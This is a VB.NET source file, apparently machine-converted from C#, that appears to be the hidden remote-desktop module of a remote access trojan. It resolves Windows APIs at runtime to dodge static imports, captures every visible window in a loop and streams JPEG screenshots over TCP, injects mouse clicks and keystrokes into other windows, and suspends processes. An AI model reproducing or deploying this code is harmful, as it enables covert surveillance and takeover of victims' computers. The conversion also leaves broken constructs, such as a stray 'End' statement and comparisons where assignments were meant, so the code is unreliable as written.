Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Runtime.Serialization.Formatters
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Text
Imports System.Threading

Namespace DLL.Functions
	Public NotInheritable Class Outils

		Private Sub New()
		End Sub


		Public Delegate Function EnumDelegate(ByVal hWnd As IntPtr, ByVal lParam As Integer) As Boolean

		Public Structure RECT
			Public Left As Integer

			Public Top As Integer

			Public Right As Integer

			Public Bottom As Integer
		End Structure

		Public Enum CWPFlags
			CWP_ALL
		End Enum

		<Flags>
		Public Enum RedrawWindowFlags As UInteger
			Invalidate = &H1UI
			InternalPaint = &H2UI
			[Erase] = &H4UI
			Validate = &H8UI
			NoInternalPaint = &H10UI
			NoErase = &H20UI
			NoChildren = &H40UI
			AllChildren = &H80UI
			UpdateNow = &H100UI
			EraseNow = &H200UI
			Frame = &H400UI
			NoFrame = &H800UI
		End Enum

		<Flags>
		Public Enum ThreadAccess
			TERMINATE = &H1
			SUSPEND_RESUME = &H2
			GET_CONTEXT = &H8
			SET_CONTEXT = &H10
			SET_INFORMATION = &H20
			QUERY_INFORMATION = &H40
			SET_THREAD_TOKEN = &H80
			IMPERSONATE = &H100
			DIRECT_IMPERSONATION = &H200
		End Enum

		Public Delegate Function DelegateIsWindowVisible(ByVal hWnd As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

		Public Delegate Function DelegateEnumDesktopWindows(ByVal hDesktop As IntPtr, ByVal lpEnumCallbackFunction As EnumDelegate, ByVal lParam As IntPtr) As Boolean

		Public Delegate Function DelegatePrintWindow(ByVal hwnd As IntPtr, ByVal hdcBlt As IntPtr, ByVal nFlags As UInteger) As Boolean

		Public Delegate Function DelegateGetWindowRect(ByVal hWnd As IntPtr, ByRef lpRect As RECT) As Boolean

		Public Delegate Function DelegateWindowFromPoint(ByVal p As Point) As IntPtr

		Public Delegate Function DelegateGetWindow(ByVal hWnd As IntPtr, ByVal uCmd As UInteger) As IntPtr

		Public Delegate Function DelegateIsZoomed(ByVal hwnd As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

		Public Delegate Function DelegateGetParent(ByVal hwnd As IntPtr) As IntPtr

		Public Delegate Function DelegateGetSystemMetrics(ByVal nIndex As Integer) As Integer



		<DllImport("kernel32", SetLastError:=True)>
		Public Shared Function LoadLibraryA(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef Name As String) As IntPtr
		End Function

		<DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
		Public Shared Function GetProcAddress(ByVal hProcess As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef Name As String) As IntPtr
		End Function

		Public Shared Function LoadApi(Of CreateApi)(ByVal name As String, ByVal method As String) As CreateApi
			Return Conversions.ToGenericParameter(Of CreateApi)(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), GetType(CreateApi)))
		End Function

		<DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
		Public Shared Function PostMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Boolean
		End Function

		<DllImport("user32.dll", SetLastError:=True)>
		Public Shared Function SendMessage(ByVal hWnd As Integer, ByVal Msg As Integer, ByVal wparam As Integer, ByVal lparam As Integer) As IntPtr
		End Function

		<DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
		Public Shared Function FindWindow(ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
		End Function

		<DllImport("user32.dll", EntryPoint:="FindWindowEx", SetLastError:=True)>
		Public Shared Function FindWindowEx2(ByVal hWnd1 As IntPtr, ByVal hWnd2 As IntPtr, ByVal lpsz1 As IntPtr, ByVal lpsz2 As String) As IntPtr
		End Function



		Public Shared Client As New TcpClient()

		Public Shared nstream As NetworkStream

		Public Shared ip As String

		Public Shared port As Integer

		Public Shared Identifier As String

		Public Shared Mutex As String

		Public Shared username As String

		Public Shared screenx As Integer = 1028

		Public Shared screeny As Integer = 1028

		Public Shared lastactive As IntPtr

		Public Shared lastactivebar As IntPtr

		Public Shared interval As Integer = 500

		Public Shared quality As Integer = 50

		Public Shared resize As Double = 0.5

		Public Shared TitleBarHeight As Integer

		Public Shared HigherThan81 As Boolean = False

		Public Shared ReadOnly IsWindowVisible As DelegateIsWindowVisible = LoadApi(Of DelegateIsWindowVisible)("user32", "IsWindowVisible")

		Public Shared ReadOnly EnumDesktopWindows As DelegateEnumDesktopWindows = LoadApi(Of DelegateEnumDesktopWindows)("user32", "EnumDesktopWindows")

		Public Shared ReadOnly PrintWindow As DelegatePrintWindow = LoadApi(Of DelegatePrintWindow)("user32", "PrintWindow")

		Public Shared ReadOnly GetWindowRect As DelegateGetWindowRect = LoadApi(Of DelegateGetWindowRect)("user32", "GetWindowRect")

		Public Shared ReadOnly WindowFromPoint As DelegateWindowFromPoint = LoadApi(Of DelegateWindowFromPoint)("user32", "WindowFromPoint")

		Public Shared ReadOnly GetWindow As DelegateGetWindow = LoadApi(Of DelegateGetWindow)("user32", "GetWindow")

		Public Shared ReadOnly IsZoomed As DelegateIsZoomed = LoadApi(Of DelegateIsZoomed)("user32", "IsZoomed")

		Public Shared ReadOnly GetParent As DelegateGetParent = LoadApi(Of DelegateGetParent)("user32", "GetParent")

		Public Shared ReadOnly GetSystemMetrics As DelegateGetSystemMetrics = LoadApi(Of DelegateGetSystemMetrics)("user32", "GetSystemMetrics")

		Public Shared startxpos As Integer

		Public Shared startypos As Integer = 0

		Public Shared startwidth As Integer

		Public Shared startheight As Integer = 0

		Public Shared handletomove As IntPtr

		Public Shared handletoresize As IntPtr

		Public Shared contextmenu As IntPtr

		Public Shared rightclicked As Boolean = False

		Public Shared codecs() As ImageCodecInfo = ImageCodecInfo.GetImageEncoders()

		Public Shared MPath As String
		'private static string MPath = Path.GetTempPath();

		Public Shared MFile As String

		Public Shared procM As New Process()

		Public Shared tempFile As String






		<DllImport("kernel32.dll", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
		Public Shared Function OpenThread(ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As UInteger) As IntPtr
		End Function


		<DllImport("kernel32.dll", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
		Public Shared Function SuspendThread(ByVal hThread As IntPtr) As UInteger
		End Function

		<DllImport("kernel32.dll", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
		Public Shared Function CloseHandle(ByVal hHandle As IntPtr) As Boolean
		End Function

		<DllImport("kernel32.dll", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
		Public Shared Function ResumeThread(ByVal hThread As IntPtr) As UInteger
		End Function

		Public Shared a As New Computer()

		Public Shared collection As New List(Of String)()

		Public Shared collection2 As Object = New List(Of IntPtr)()

		Public Shared newt As New Thread(AddressOf SCT)




		Public Shared Function FindHandle(ByVal title As String) As IntPtr
			collection = New List(Of String)()
			collection2 = New List(Of IntPtr)()
			'INSTANT VB TODO TASK: There is no equivalent to a 'checked' block in VB:
			'			checked
			Dim lpEnumCallbackFunction As EnumDelegate = Function(hWnd As IntPtr, lParam As Integer)
															 Dim result2 As Boolean = Nothing
															 Try
																 Dim stringBuilder As New StringBuilder(255)
																 Dim hWnd2 As IntPtr = hWnd
																 Dim countOfChars As Integer = stringBuilder.Capacity + 1
																 Dim result As IntPtr = IntPtr.Zero
																 Dim num2 As Integer = CInt(Math.Truncate(SendMessageTimeoutText(hWnd2, 13, countOfChars, stringBuilder, 2, 1000UI, result)))
																 Dim text As String = stringBuilder.ToString()
																 If IsWindowVisible(hWnd) AndAlso (Not String.IsNullOrEmpty(text)) Then
																	 Dim instance As Object = collection2
																	 Dim obj2() As Object = {hWnd}
																	 Dim array() As Object = obj2
																	 Dim obj3() As Boolean = {True}
																	 Dim array2() As Boolean = obj3
																	 NewLateBinding.LateCall(instance, Nothing, "Add", obj2, Nothing, Nothing, obj3, IgnoreReturn:=True)
																	 If array2(0) Then
																		 hWnd = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array(0)), GetType(IntPtr)), IntPtr)
																	 End If
																	 collection.Add(text)
																 End If
																 result2 = True
																 Return result2
															 Catch projectError As Exception
																 ProjectData.SetProjectError(projectError)
																 ProjectData.ClearProjectError()
																 Return result2
															 End Try
														 End Function
			EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero)
			Dim num As Integer = collection.Count - 1
			Dim i As Integer = num
			Do While i >= 0
				If collection(i).ToLower().Contains(title.ToLower()) Then
					Dim obj As Object = NewLateBinding.LateIndexGet(collection2, New Object(0) {i}, Nothing)
					Return If(obj IsNot Nothing, (DirectCast(obj, IntPtr)), Nothing)
				End If
				i += -1
			Loop
			Return Nothing
			'INSTANT VB TODO TASK: End of the original C# 'checked' block.
		End Function


		Public Shared Sub SendInformation(ByVal stream As Stream, ByVal message As Object)
			If message Is Nothing Then
				Return
			End If
			Dim binaryFormatter As New BinaryFormatter()
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways
			binaryFormatter.FilterLevel = TypeFilterLevel.Full
			'INSTANT VB TODO TASK: There is no equivalent to a 'checked' block in VB:
			'			checked
			SyncLock Client
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(message)
				Dim num As ULong = 0UL
				Dim memoryStream As New MemoryStream()
				binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue))
				num = CULng(memoryStream.Position)
				Client.GetStream().Write(BitConverter.GetBytes(num), 0, 8)
				Dim buffer() As Byte = memoryStream.GetBuffer()
				Client.GetStream().Write(buffer, 0, CInt(num))
				memoryStream.Close()
				memoryStream.Dispose()
			End SyncLock
			'INSTANT VB TODO TASK: End of the original C# 'checked' block.
		End Sub


		Public Shared Function IsFileOpen(ByVal file As FileInfo) As Object
			Dim result As Object = Nothing
			If file.Exists Then
				Dim fileStream As FileStream = Nothing
				Try
					fileStream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None)
					fileStream.Close()
					result = False
					Return result
				Catch ex As Exception
					ProjectData.SetProjectError(ex)
					Dim ex2 As Exception = ex
					If TypeOf ex2 Is IOException Then
						result = True
						ProjectData.ClearProjectError()
						Return result
					End If
					ProjectData.ClearProjectError()
					Return result
				End Try
			End If
			Return result
		End Function


		Public Shared Sub SuspendProcess(ByVal process As Process)
			Dim enumerator As IEnumerator = Nothing
			Try
				enumerator = process.Threads.GetEnumerator()
				Do While enumerator.MoveNext()
					Dim processThread As ProcessThread = DirectCast(enumerator.Current, ProcessThread)
					'INSTANT VB TODO TASK: There is no VB equivalent to 'checked' in this context:
					'ORIGINAL LINE: IntPtr intPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: False, checked((uint)processThread.Id));
					Dim intPtr As IntPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle:=False, CUInt(processThread.Id))
					If intPtr <> System.IntPtr.Zero Then
						SuspendThread(intPtr)
						CloseHandle(intPtr)
					End If
				Loop
			Finally
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		Public Shared Sub ResumeProcess(ByVal process As Process)
			Dim enumerator As IEnumerator = Nothing
			Try
				enumerator = process.Threads.GetEnumerator()
				Do While enumerator.MoveNext()
					Dim processThread As ProcessThread = DirectCast(enumerator.Current, ProcessThread)
					'INSTANT VB TODO TASK: There is no VB equivalent to 'checked' in this context:
					'ORIGINAL LINE: IntPtr intPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: False, checked((uint)processThread.Id));
					Dim intPtr As IntPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle:=False, CUInt(processThread.Id))
					If intPtr <> System.IntPtr.Zero Then
						ResumeThread(intPtr)
						CloseHandle(intPtr)
					End If
				Loop
			Finally
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub


		Class SurroundingClass
			Public Shared Sub PostClickLD(ByVal x As Integer, ByVal y As Integer)
				Dim intPtr As IntPtr = (CSharpImpl.__Assign(lastactive, WindowFromPoint(New Point(x, y))))
				Dim lpRect As RECT = Nothing
				GetWindowRect(intPtr, lpRect)
				'				BEGIN
				'TODO:           Visual Basic does Not support checked statements!
				Dim point As Point = New Point(x - lpRect.Left, y - lpRect.Top)
				Dim lpClassName As String = "#32768"
				Dim intPtr2 As IntPtr = FindWindow(lpClassName, Nothing)

				If intPtr2 <> IntPtr.Zero Then
					contextmenu = intPtr2
					Dim lParam As IntPtr = CType(MakeLParam(x, y), IntPtr)
					PostMessage(contextmenu, 513UI, New IntPtr(1), lParam)
					rightclicked = True
				ElseIf GetParent(intPtr) = CType(0, IntPtr) AndAlso y - lpRect.Top < TitleBarHeight Then
					lastactivebar = intPtr
					PostMessage(intPtr, 513UI, CType(1, IntPtr), CType(MakeLParam(x - lpRect.Left, y - lpRect.Top), IntPtr))
					startxpos = x
					startypos = y
					handletomove = intPtr
					SetWindowPos(intPtr, New IntPtr(-2), 0, 0, 0, 0, 3UI)
					SetWindowPos(intPtr, New IntPtr(-1), 0, 0, 0, 0, 3UI)
					SetWindowPos(intPtr, New IntPtr(-2), 0, 0, 0, 0, 67UI)
				ElseIf GetParent(intPtr) = CType(0, IntPtr) AndAlso point.X > lpRect.Right - lpRect.Left - 10 AndAlso point.Y > lpRect.Bottom - lpRect.Top - 10 Then
					startwidth = x
					startheight = y
					handletoresize = intPtr
				Else
					PostMessage(intPtr, 513UI, CType(1, IntPtr), CType(MakeLParam(x - lpRect.Left, y - lpRect.Top), IntPtr))
				End If
				End
				'TODO:           Visual Basic does Not support checked statements!
			End Sub

			Private Class CSharpImpl
				<Obsolete("Please refactor calling code to use normal Visual Basic assignment")>
				Shared Function __Assign(Of T)(ByRef target As T, value As T) As T
					target = value
					Return value
				End Function
			End Class
		End Class

		Public Shared Sub PostClickLU(ByVal x As Integer, ByVal y As Integer)
			Dim hWnd As IntPtr = WindowFromPoint(New Point(x, y))
			Dim lpRect As RECT = Nothing
			GetWindowRect(hWnd, lpRect)

			'			checked
			If rightclicked Then
				PostMessage(contextmenu, 514UI, New IntPtr(1), New IntPtr(MakeLParam(x, y)))
				rightclicked = False
				contextmenu = IntPtr.Zero
			ElseIf (startxpos > 0) Or (startypos > 0) Then
				PostMessage(handletomove, 514UI, New IntPtr(0L), New IntPtr(MakeLParam(x - lpRect.Left, y - lpRect.Top)))
				Dim lpRect2 As RECT = Nothing
				GetWindowRect(handletomove, lpRect2)
				Dim num As Integer = x - startxpos
				Dim num2 As Integer = y - startypos
				Dim num3 As Integer = lpRect2.Left + num
				Dim num4 As Integer = lpRect2.Top + num2
				SetWindowPos(handletomove, New IntPtr(0), lpRect2.Left + num, lpRect2.Top + num2, lpRect2.Right - lpRect2.Left, lpRect2.Bottom - lpRect2.Top, 64UI)
				startxpos = 0
				startypos = 0
				handletomove = IntPtr.Zero
			ElseIf (startwidth > 0) Or (startheight > 0) Then
				Dim lpRect3 As RECT = Nothing
				GetWindowRect(handletoresize, lpRect3)
				Dim num5 As Integer = x - startwidth
				Dim num6 As Integer = y - startheight
				Dim cx As Integer = lpRect3.Right - lpRect3.Left + num5
				Dim cy As Integer = lpRect3.Bottom - lpRect3.Top + num6
				SetWindowPos(handletoresize, New IntPtr(0), lpRect3.Left, lpRect3.Top, cx, cy, 64UI)
				startwidth = 0
				startheight = 0
				handletoresize = IntPtr.Zero
			Else
				PostMessage(hWnd, 514UI, New IntPtr(0L), New IntPtr(MakeLParam(x - lpRect.Left, y - lpRect.Top)))
			End If

		End Sub

		Public Shared Sub PostClickRD(ByVal x As Integer, ByVal y As Integer)
			Dim hWnd As IntPtr = WindowFromPoint(New Point(x, y))
			Dim lpRect As RECT = Nothing
			GetWindowRect(hWnd, lpRect)

			'			checked
			Dim point As New Point(x - lpRect.Left, y - lpRect.Top)

			'ORIGINAL LINE: PostMessage(lastactive = WindowFromPoint(new Point(x, y)), 516u, (IntPtr)0L, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			PostMessage(lastactive = WindowFromPoint(New Point(x, y)), 516UI, New IntPtr(0L), New IntPtr(MakeLParam(x - lpRect.Left, y - lpRect.Top)))

		End Sub

		Public Shared Sub PostClickRU(ByVal x As Integer, ByVal y As Integer)
			Dim hWnd As IntPtr = WindowFromPoint(New Point(x, y))
			Dim lpRect As RECT = Nothing
			GetWindowRect(hWnd, lpRect)
			'			checked
			Dim point As New Point(x - lpRect.Left, y - lpRect.Top)
			Dim hWnd2 As IntPtr = WindowFromPoint(New Point(x, y))
			PostMessage(hWnd2, 517UI, New IntPtr(0L), New IntPtr(MakeLParam(x - lpRect.Left, y - lpRect.Top)))
			'INSTANT VB TODO TASK: End of the original C# 'checked' block.
		End Sub

		Public Shared Sub PostDblClk(ByVal x As Integer, ByVal y As Integer)
			Dim hWnd As IntPtr = WindowFromPoint(New Point(x, y))
			Dim lpRect As RECT = Nothing
			GetWindowRect(hWnd, lpRect)

			'			checked
			Dim point As New Point(x - lpRect.Left, y - lpRect.Top)

			'ORIGINAL LINE: PostMessage(lastactive = WindowFromPoint(new Point(x, y)), 515u, (IntPtr)0L, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			PostMessage(lastactive = WindowFromPoint(New Point(x, y)), 515UI, New IntPtr(0L), New IntPtr(MakeLParam(x - lpRect.Left, y - lpRect.Top)))

		End Sub

		Public Shared Sub PostMove(ByVal x As Integer, ByVal y As Integer)
			Dim hWnd As IntPtr = WindowFromPoint(New Point(x, y))
			Dim lpRect As RECT = Nothing
			GetWindowRect(hWnd, lpRect)

			'ORIGINAL LINE: PostMessage(hWnd, 512u, (IntPtr)0L, (IntPtr)checked(MakeLParam(x - lpRect.Left, y - lpRect.Top)));
			PostMessage(hWnd, 512UI, New IntPtr(0L), New IntPtr(MakeLParam(x - lpRect.Left, y - lpRect.Top)))
		End Sub

		Public Shared Sub PostKeyDown(ByVal k As String)
			Dim num As Integer = Strings.AscW(k)
			If num = 8 OrElse num = 13 Then
				PostMessage(lastactive, 256UI, CType(Conversions.ToInteger("&H" & Conversion.Hex(Strings.AscW(k))), IntPtr), CreateLParamFor_WM_KEYDOWN(1, 30, IsExtendedKey:=False, DownBefore:=False))
				PostMessage(lastactive, 257UI, CType(Conversions.ToInteger("&H" & Conversion.Hex(Strings.AscW(k))), IntPtr), CreateLParamFor_WM_KEYUP(1, 30, IsExtendedKey:=False))
			Else
				PostMessage(lastactive, 258UI, CType(Strings.AscW(k), IntPtr), New IntPtr(1))
			End If
		End Sub

		Public Shared Function KeysLParam(ByVal RepeatCount As UShort, ByVal ScanCode As Byte, ByVal IsExtendedKey As Boolean, ByVal DownBefore As Boolean, ByVal State As Boolean) As IntPtr
			Dim num As Integer = RepeatCount Or (CInt(ScanCode) << 16)
			If IsExtendedKey Then
				num = num Or &H10000
			End If
			If DownBefore Then
				num = num Or &H40000000
			End If
			If State Then
				num = num Or Integer.MinValue
			End If
			Return New IntPtr(num)
		End Function

		Public Shared Function CreateLParamFor_WM_KEYDOWN(ByVal RepeatCount As UShort, ByVal ScanCode As Byte, ByVal IsExtendedKey As Boolean, ByVal DownBefore As Boolean) As IntPtr
			Return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, State:=False)
		End Function

		Public Shared Function CreateLParamFor_WM_KEYUP(ByVal RepeatCount As UShort, ByVal ScanCode As Byte, ByVal IsExtendedKey As Boolean) As IntPtr
			Return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore:=True, State:=True)
		End Function

		Public Shared Function MakeLParam(ByVal LoWord As Integer, ByVal HiWord As Integer) As Integer
			Return (HiWord << 16) Or (LoWord And &HFFFF)
		End Function

		Public Shared Sub SCT()
			Do
				Try
					Dim message As Bitmap = RenderScreenshot()
					Outils.SendInformation(nstream, message)
				Catch ex As Exception
					ProjectData.SetProjectError(ex)
					Dim ex2 As Exception = ex
					ProjectData.ClearProjectError()
				End Try
				Thread.Sleep(interval)
			Loop
		End Sub


		Public Shared Function RenderScreenshot() As Bitmap

			'			checked
			Dim result As Bitmap = Nothing
			Try
				Dim t = New List(Of IntPtr)()
				Dim lpEnumCallbackFunction As EnumDelegate = Function(hWnd As IntPtr, lParam As Integer)
																 Dim result2 As Boolean = Nothing
																 Try
																	 If IsWindowVisible(hWnd) Then
																		 t.Add(hWnd)
																	 End If
																	 result2 = True
																	 Return result2
																 Catch projectError4 As Exception
																	 ProjectData.SetProjectError(projectError4)
																	 ProjectData.ClearProjectError()
																	 Return result2
																 End Try
															 End Function
				If EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero) Then
					Dim bitmap As New Bitmap(screenx, screeny)
					Dim num As Integer = t.Count - 1
					Dim i As Integer = num
					Do While i >= 0
						Try
							Dim lpRect As RECT = Nothing
							GetWindowRect(t(i), lpRect)
							Dim image As New Bitmap(lpRect.Right - lpRect.Left + 1, lpRect.Bottom - lpRect.Top + 1)
							Dim graphics As Graphics = System.Drawing.Graphics.FromImage(image)
							Dim hdc As IntPtr = graphics.GetHdc()
							Try
								If HigherThan81 Then
									PrintWindow(t(i), hdc, 2UI)
								Else
									PrintWindow(t(i), hdc, 0UI)
								End If
							Catch projectError As Exception
								ProjectData.SetProjectError(projectError)
								ProjectData.ClearProjectError()
							End Try
							graphics.ReleaseHdc(hdc)
							graphics.FillRectangle(Brushes.Gray, lpRect.Right - lpRect.Left - 10, lpRect.Bottom - lpRect.Top - 10, 10, 10)
							Dim graphics2 As Graphics = System.Drawing.Graphics.FromImage(bitmap)
							graphics2.DrawImage(image, lpRect.Left, lpRect.Top)
						Catch projectError2 As Exception
							ProjectData.SetProjectError(projectError2)
							ProjectData.ClearProjectError()
						End Try
						i += -1
					Loop
					Dim bitmap2 As New Bitmap(bitmap, CInt(Math.Truncate(Math.Round(CDbl(screenx) * resize))), CInt(Math.Truncate(Math.Round(CDbl(screeny) * resize))))
					Dim encoder As ImageCodecInfo = get_Codec("image/jpeg")
					Dim encoderParameters As New EncoderParameters(1)
					encoderParameters.Param(0) = New EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality)
					Dim stream As New MemoryStream()
					bitmap2.Save(stream, encoder, encoderParameters)
					Dim bitmap3 As Bitmap = CType(Image.FromStream(stream), Bitmap)
					bitmap2.Dispose()
					GC.Collect()
					result = bitmap3
					Return result
				End If
				Return result
			Catch ex As Exception
				ProjectData.SetProjectError(ex)
				Dim ex2 As Exception = ex
				Outils.SendInformation(nstream, "60|" & ex2.ToString())
				Try
					result = ReturnBMP()
					ProjectData.ClearProjectError()
					Return result
				Catch projectError3 As Exception
					ProjectData.SetProjectError(projectError3)
					ProjectData.ClearProjectError()
				End Try
				ProjectData.ClearProjectError()
				Return result
			End Try

		End Function

		Public Shared Function get_Codec(ByVal type As String) As ImageCodecInfo
			If type Is Nothing Then
				Return Nothing
			End If
			Dim array() As ImageCodecInfo = codecs
			For Each imageCodecInfo As ImageCodecInfo In array
				If Operators.CompareString(imageCodecInfo.MimeType, type, TextCompare:=False) = 0 Then
					Return imageCodecInfo
				End If
			Next imageCodecInfo
			Return Nothing
		End Function

		Public Shared Function ReturnBMP() As Bitmap
			Dim bitmap As New Bitmap(screenx, screeny)
			Using graphics As Graphics = System.Drawing.Graphics.FromImage(bitmap)
				Dim brush As SolidBrush = CType(Brushes.Red, SolidBrush)
				graphics.FillRectangle(brush, 0, 0, screenx, screeny)
			End Using
			Return bitmap
		End Function


		<DllImport("user32.dll", CharSet:=CharSet.Auto, EntryPoint:="SendMessageTimeout", SetLastError:=True)>
		Public Shared Function SendMessageTimeoutText(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal countOfChars As Integer, ByVal text As StringBuilder, ByVal flags As Integer, ByVal uTImeoutj As UInteger, <System.Runtime.InteropServices.Out()> ByRef result As IntPtr) As UInteger
		End Function

		Public Shared Function Isgreaterorequalto81() As Object
			Dim result As Object = Nothing
			Try
				Dim oSVersion As OperatingSystem = Environment.OSVersion
				Dim version As Version = oSVersion.Version
				If oSVersion.Platform = PlatformID.Win32NT Then
					Dim major As Integer = version.Major
					If major = 6 AndAlso version.Minor <> 0 AndAlso version.Minor <> 1 Then
						result = True
						Return result
					End If
				End If
				result = False
				Return result
			Catch projectError As Exception
				ProjectData.SetProjectError(projectError)
				ProjectData.ClearProjectError()
				Return result
			End Try
		End Function

		<DllImport("user32.dll")>
		Public Shared Function ShowWindow(ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.I4)> ByVal nCmdShow As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
		End Function

		<DllImport("user32.dll", SetLastError:=True)>
		Public Shared Function SetWindowPos(ByVal hWnd As IntPtr, ByVal hWndInsertAfter As IntPtr, ByVal X As Integer, ByVal Y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal uFlags As UInteger) As Boolean
		End Function


	End Class
End Namespace
